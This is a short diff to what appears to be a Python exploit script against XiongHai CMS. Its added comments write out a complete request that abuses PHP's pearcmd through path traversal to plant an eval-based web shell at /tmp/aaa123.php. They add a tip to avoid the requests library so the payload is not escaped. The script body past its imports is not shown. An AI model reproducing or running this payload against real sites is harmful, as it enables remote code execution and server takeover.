@@ -1,5 +1,9 @@
+# pearlcmd_熊海cms_xionghai
 # 环境搭建  https://down.chinaz.com/soft/36930.htm
 # cms代码审计 https://mp.weixin.qq.com/s/WHRKGfYmaBSNqQpRjijHGA
+# burp发送或用下面脚本  /?+config-create+/&r=../../../../../../../../../usr/share/pear/pearcmd&<?=eval($_REQUEST[1]);?>+/tmp/aaa123.php
+## 不要用requests包发，会转义
+
 
 import requests
 import urllib.request
